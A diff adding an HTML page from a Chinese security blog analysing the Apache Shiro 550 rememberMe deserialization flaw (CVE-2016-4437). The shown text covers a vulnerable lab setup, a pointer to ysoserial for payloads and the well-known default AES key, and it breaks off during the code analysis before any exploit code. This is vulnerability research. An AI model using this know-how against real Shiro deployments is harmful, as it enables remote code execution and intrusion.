@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言shiro反序列化漏洞这个从 shiro 550 开始，在2016年就爆出来, 但是到现在在各种攻防演练中也起到了显著作用 这个漏洞一直都很好用，特别是一些红蓝对抗HW的下边界突破很好用 遂研究一下这个漏洞的成因和分析一下代码 0x01 Shiro 550 漏洞描述Apache Shiro RememberMe 反序列化导致的命令执行漏洞 Apache Shiro是一个强大且易用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro 550 反序列化漏洞 详细分析+poc编写">
+<meta property="og:url" content="https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/index.html">
+<meta property="og:site_name" content="Zeo 安全实验室">
+<meta property="og:description" content="0x00 前言shiro反序列化漏洞这个从 shiro 550 开始，在2016年就爆出来, 但是到现在在各种攻防演练中也起到了显著作用 这个漏洞一直都很好用，特别是一些红蓝对抗HW的下边界突破很好用 遂研究一下这个漏洞的成因和分析一下代码 0x01 Shiro 550 漏洞描述Apache Shiro RememberMe 反序列化导致的命令执行漏洞 Apache Shiro是一个强大且易用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDMxMTExMzAucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTMyMjQucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDA2MzEucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDEzMjkucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDE0MTkucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDI0MTgucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDMyMjMucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM1MDEucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM4MDYucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDQ2MTQucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDU2MzkucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTA3NDEucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTMyMzIucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTM0MjMucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDAxMjAucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDA0NDgucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDE4NTIucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI3MTcucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI5NDUucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDM0MTgucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjE5NDcucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI2NDcucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI4MTkucG5n?x-oss-process=image/format,png">
+<meta property="og:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTEzMjMucG5n?x-oss-process=image/format,png">
+<meta property="article:published_time" content="2020-09-03T10:51:50.000Z">
+<meta property="article:modified_time" content="2020-10-14T01:57:28.130Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDMxMTExMzAucG5n?x-oss-process=image/format,png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Shiro 550 反序列化漏洞 详细分析+poc编写</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/09/09/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/08/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BECommonsCollections1%E8%AF%A6%E8%A7%A3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&text=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&is_video=false&description=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro 550 反序列化漏洞 详细分析+poc编写&body=Check out this article: https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&title=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&name=Shiro 550 反序列化漏洞 详细分析+poc编写&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/&t=Shiro 550 反序列化漏洞 详细分析+poc编写" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-Shiro-550-漏洞描述"><span class="toc-number">2.</span> <span class="toc-text">0x01 Shiro 550 漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-环境搭建"><span class="toc-number">3.</span> <span class="toc-text">0x02 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础环境"><span class="toc-number">3.1.</span> <span class="toc-text">基础环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搭建过程"><span class="toc-number">3.2.</span> <span class="toc-text">搭建过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正常搭建"><span class="toc-number">3.2.1.</span> <span class="toc-text">正常搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#坑点："><span class="toc-number">3.3.</span> <span class="toc-text">坑点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-代码分析"><span class="toc-number">4.</span> <span class="toc-text">0x03 代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#加密过程"><span class="toc-number">4.1.</span> <span class="toc-text">加密过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解密过程："><span class="toc-number">4.2.</span> <span class="toc-text">解密过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#详细看看decrypt解密函数："><span class="toc-number">4.2.1.</span> <span class="toc-text">详细看看decrypt解密函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解密完成，序列化操作"><span class="toc-number">4.3.</span> <span class="toc-text">解密完成，序列化操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-编写POC-EXP"><span class="toc-number">5.</span> <span class="toc-text">0x04 编写POC EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#本次AES加密的一些小知识点："><span class="toc-number">5.1.</span> <span class="toc-text">本次AES加密的一些小知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">5.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python代码"><span class="toc-number">5.3.</span> <span class="toc-text">Python代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-修复"><span class="toc-number">6.</span> <span class="toc-text">0x05 修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-总结"><span class="toc-number">7.</span> <span class="toc-text">0x06 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-小trips："><span class="toc-number">8.</span> <span class="toc-text">0x07 小trips：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Shiro 550 反序列化漏洞 详细分析+poc编写
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Zeo 安全实验室</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-03T10:51:50.000Z" itemprop="datePublished">2020-09-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>shiro反序列化漏洞这个从 shiro 550 开始，在2016年就爆出来, 但是到现在在各种攻防演练中也起到了显著作用</p>
+<p>这个漏洞一直都很好用，特别是一些红蓝对抗HW的下边界突破很好用</p>
+<p>遂研究一下这个漏洞的成因和分析一下代码</p>
+<h1 id="0x01-Shiro-550-漏洞描述"><a href="#0x01-Shiro-550-漏洞描述" class="headerlink" title="0x01 Shiro 550 漏洞描述"></a>0x01 Shiro 550 漏洞描述</h1><p>Apache Shiro RememberMe 反序列化导致的命令执行漏洞</p>
+<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理</p>
+<p>编号：Shiro-550, CVE-2016-4437</p>
+<p>版本：Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p>
+<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><p>编辑器：IDEA 2020</p>
+<p>java版本：jdk1.7.0_80</p>
+<p>Server版本 : Tomcat 8.5.56</p>
+<p>shiro版本：shiro-root-1.2.4</p>
+<p>组件：commons-collections4</p>
+<h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>如果闲配置麻烦，也可以直接用我弄好的GitHub地址</p>
+<p><a href="https://github.com/godzeo/shiro\_1.2.4\_sample.git" target="_blank" rel="noopener">https://github.com/godzeo/shiro\_1.2.4\_sample.git</a></p>
+<h3 id="正常搭建"><a href="#正常搭建" class="headerlink" title="正常搭建"></a>正常搭建</h3><p>直接下载：</p>
+<p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4" target="_blank" rel="noopener">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
+<p>下载好以后直接解压</p>
+<p>然后偷偷的进入samples/web目录，直接修改pom文件，主要修改下面这些</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--  这里需要将jstl设置为<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后部署，我就直接使用IEDA 部署了</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDMxMTExMzAucG5n?x-oss-process=image/format,png" alt="image-20200903111130024"></p>
+<h2 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h2><p>如果有使用maven打包搭建的话，可能遇到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to execute goal org.apache.maven.plugins:maven-toolchains-plugin:1.1:toolchain (default) on project samples-web: Misconfigured toolchains.</span><br></pre></td></tr></table></figure>
+
+<p>这应该是maven打包这里要1.6的环境，但运行不影响</p>
+<p>需要修改 maven/conf/toolchains.xml 的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;&#x2F;type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;&#x2F;version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;&#x2F;vendor&gt;</span><br><span class="line">    &lt;&#x2F;provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;1.6.0.jdk&lt;&#x2F;jdkHome&gt;</span><br><span class="line">    &lt;&#x2F;configuration&gt;</span><br><span class="line">&lt;&#x2F;toolchain&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们还需要产生payload的 ysoserial</p>
+<p>ysoserial项目源码在这里<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a> ，然后自己编译， 也可直接下载编译好的release。</p>
+<h1 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h1><p>简单介绍一下漏洞：</p>
+<p>简单介绍利用：</p>
+<ul>
+<li><p>通过在cookie的rememberMe字段中插入恶意payload，</p>
+</li>
+<li><p>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。</p>
+</li>
+<li><p>shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==</p>
+</li>
+<li><p>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</p>
+</li>
+</ul>
+<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>找入口点的话，就是这个漏洞一直提的硬编码地方下手，然后稍微回溯就找到，我们也只需关注rememberMe这个处理就好了</p>
+<p>首先找到/shiro-core-1.2.4.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.class，该类位于shiro-core模块</p>
+<p>我们发现了，我们最常见的，常常提到的的key，那么入口点可能在这里</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTMyMjQucG5n?x-oss-process=image/format,png" alt="image-20200902093224310"></p>
+<ul>
+<li>他是继承了RememberMeManager类，那么我们向上溯源：找到RememberMeManager类的onSuccessfulLogin方法，看名字就直接是登陆成功的处理</li>
+<li>那我们下一个断点，研究一下这个rememberme的加密和处理流程，是个什么原理</li>
+</ul>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDA2MzEucG5n?x-oss-process=image/format,png" alt="image-20200902100631808"></p>
+<p>所以我们登陆一下，debug开启！记得要勾选Remember Me哦</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDEzMjkucG5n?x-oss-process=image/format,png" alt="image-20200902101329183"></p>
+<p>然后我们收到数据了，直接步入跟进</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDE0MTkucG5n?x-oss-process=image/format,png" alt="image-20200902101419301"></p>
+<p>转入了forgetIdentity函数，处理request和response请求，继续跟进this.forgetIdentity方法，进入了</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EM2oRAEz-1599130237592)(…/Library/Application Support/typora-user-images/image-20200902102404236.png)]</p>
+<p>继续跟进this.forgetIdentity方法，进入了getCookie的removeFrom方法，跟进removeFrom方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.getCookie().removeFrom(request, response);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDI0MTgucG5n?x-oss-process=image/format,png" alt="image-20200902102418678"></p>
+<ul>
